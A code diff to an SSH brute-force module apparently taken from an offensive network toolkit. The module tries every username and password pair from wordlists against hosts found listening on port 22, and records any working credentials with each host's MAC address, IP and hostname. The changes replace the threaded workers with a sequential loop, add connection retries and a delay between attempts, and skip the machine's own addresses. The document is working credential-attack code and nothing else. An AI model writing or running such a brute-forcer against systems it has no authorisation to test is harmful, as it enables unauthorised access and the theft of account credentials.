@@ -3,12 +3,11 @@ ssh_connector.py - This script performs a brute force attack on SSH services (po
 """
 
 import os
+import time
 import pandas as pd
 import paramiko
 import socket
-import threading
 import logging
-from queue import Queue, Empty
 from rich.console import Console
 from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
 from shared import SharedData
@@ -103,7 +102,6 @@ class SSHConnector:
         self.users = open(shared_data.usersfile, "r").read().splitlines()
         self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()
 
-        self.lock = threading.Lock()
         self.sshfile = shared_data.sshfile
         if not os.path.exists(self.sshfile):
             logger.info(f"File {self.sshfile} does not exist. Creating...")
@@ -111,7 +109,6 @@ class SSHConnector:
                 f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
         self.results = []  # Successful credentials for the current bruteforce run
         self._pending_results = []  # Entries waiting to be flushed to disk
-        self.queue = Queue()
         self.console = Console()
 
     def load_scan_file(self):
@@ -127,67 +124,68 @@ class SSHConnector:
         self.scan = self.scan[self.scan["Ports"].str.contains("22", na=False)]
 
     def ssh_connect(self, adresse_ip, user, password):
-        """Attempt to connect to SSH using only the supplied credentials."""
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
-        try:
-            ssh.connect(
-                adresse_ip,
-                username=user,
-                password=password,
-                port=22,
-                timeout=15,
-                auth_timeout=15,
-                banner_timeout=15,
-                look_for_keys=False,  # Prevent consuming auth attempts with key probing
-                allow_agent=False
-            )
-            logger.debug(f"SSH login succeeded for {adresse_ip} using {user}:{password}")
-            return True
-        except paramiko.AuthenticationException:
-            logger.debug(f"SSH authentication failed for {adresse_ip} | user={user}")
-            return False
-        except (socket.error, paramiko.SSHException) as exc:
-            logger.warning(f"SSH connection error to {adresse_ip}: {exc}")
-            return False
-        finally:
-            ssh.close()
-
-    def worker(self, progress, task_id, success_flag):
-        """
-        Worker thread to process items in the queue.
-        """
-        while True:
-            if self.shared_data.orchestrator_should_exit:
-                logger.info("Orchestrator exit signal received, stopping worker thread.")
-                break
-
-            if success_flag[0]:
-                break
-
+        """Attempt to connect to SSH using only the supplied credentials.
+        Retries up to 3 times on banner/connection errors with backoff."""
+        max_retries = 3
+        for attempt in range(max_retries):
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             try:
-                adresse_ip, user, password, mac_address, hostname, port = self.queue.get(timeout=0.5)
-            except Empty:
-                break
+                ssh.connect(
+                    adresse_ip,
+                    username=user,
+                    password=password,
+                    port=22,
+                    timeout=15,
+                    auth_timeout=15,
+                    banner_timeout=15,
+                    look_for_keys=False,
+                    allow_agent=False
+                )
+                logger.debug(f"SSH login succeeded for {adresse_ip} using {user}:{password}")
+                return True
+            except paramiko.AuthenticationException:
+                logger.debug(f"SSH authentication failed for {adresse_ip} | user={user}")
+                return False
+            except (socket.error, paramiko.SSHException, EOFError) as exc:
+                if attempt < max_retries - 1:
+                    delay = 2 + attempt * 2  # 2s, 4s backoff
+                    logger.debug(f"SSH banner/connection error to {adresse_ip} (attempt {attempt+1}/{max_retries}), retrying in {delay}s: {exc}")
+                    time.sleep(delay)
+                else:
+                    logger.warning(f"SSH connection error to {adresse_ip} after {max_retries} attempts: {exc}")
+                    return False
+            finally:
+                ssh.close()
 
-            if self.ssh_connect(adresse_ip, user, password):
-                with self.lock:
-                    entry = [mac_address, adresse_ip, hostname, user, password, port]
-                    self.results.append(entry)
-                    self._pending_results.append(entry)
-                    logger.success(
-                        f"Found SSH credentials -> IP: {adresse_ip} | User: {user} | Password: {password}"
-                    )
-                    self.save_results()
-                    if not success_flag[0]:
-                        success_flag[0] = True
-                        self._clear_queue()
-            self.queue.task_done()
-            progress.update(task_id, advance=1)
-
+    @staticmethod
+    def _get_local_ips():
+        """Get all IP addresses belonging to this machine."""
+        local_ips = {'127.0.0.1', '::1'}
+        try:
+            hostname = socket.gethostname()
+            for info in socket.getaddrinfo(hostname, None):
+                local_ips.add(info[4][0])
+        except socket.gaierror:
+            pass
+        # Also try the common netifaces approach via ip command
+        try:
+            import subprocess
+            result = subprocess.run(
+                ['hostname', '-I'], capture_output=True, text=True, timeout=5
+            )
+            if result.returncode == 0:
+                local_ips.update(result.stdout.strip().split())
+        except Exception:
+            pass
+        return local_ips
 
     def run_bruteforce(self, adresse_ip, port):
+        # Skip brute-forcing our own machine
+        if adresse_ip in self._get_local_ips():
+            logger.info(f"Skipping SSH bruteforce on {adresse_ip} (this is our own machine)")
+            return False, []
+
         self.load_scan_file()  # Reload the scan file to get the latest IPs and ports
 
         # Reset trackers for a fresh run on this host
@@ -202,55 +200,42 @@ class SSHConnector:
         mac_address = ip_rows['MAC Address'].values[0]
         hostname = ip_rows['Hostnames'].values[0]
 
-        total_tasks = len(self.users) * len(self.passwords)
-        
-        for user in self.users:
-            for password in self.passwords:
-                if self.shared_data.orchestrator_should_exit:
-                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
-                    return False, []
-                self.queue.put((adresse_ip, user, password, mac_address, hostname, port))
+        # Build credential list
+        cred_list = [(user, password) for user in self.users for password in self.passwords]
+        total_tasks = len(cred_list)
+        success = False
 
-        success_flag = [False]
-        threads = []
-        
         with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
             task_id = progress.add_task("[cyan]Bruteforcing SSH...", total=total_tasks)
-            
-            for _ in range(6):  # Adjust the number of threads based on the RPi Zero's capabilities
-                t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
-                t.start()
-                threads.append(t)
 
-            while not self.queue.empty():
+            for i, (user, password) in enumerate(cred_list):
                 if self.shared_data.orchestrator_should_exit:
                     logger.info("Orchestrator exit signal received, stopping bruteforce.")
-                    while not self.queue.empty():
-                        self.queue.get()
-                        self.queue.task_done()
                     break
 
-            self.queue.join()
+                # Cooldown between attempts to avoid overwhelming SSH daemon
+                if i > 0:
+                    time.sleep(1)
 
-            for t in threads:
-                t.join()
+                if self.ssh_connect(adresse_ip, user, password):
+                    entry = [mac_address, adresse_ip, hostname, user, password, port]
+                    self.results.append(entry)
+                    self._pending_results.append(entry)
+                    logger.success(
+                        f"Found SSH credentials -> IP: {adresse_ip} | User: {user} | Password: {password}"
+                    )
+                    self.save_results()
+                    success = True
+                    progress.update(task_id, completed=total_tasks)
+                    break
 
-        # Final flush/dedup after all threads complete to guarantee persistence
-        with self.lock:
-            self.save_results()
-            self.removeduplicates()
+                progress.update(task_id, advance=1)
 
-        return success_flag[0], list(self.results)
+        # Final flush/dedup after completion
+        self.save_results()
+        self.removeduplicates()
 
-    def _clear_queue(self):
-        """Remove remaining queued tasks once credentials succeed."""
-        while not self.queue.empty():
-            try:
-                self.queue.get_nowait()
-                self.queue.task_done()
-            except Empty:
-                break
-
+        return success, list(self.results)
 
     def save_results(self):
         """Persist pending successful connection attempts to disk."""
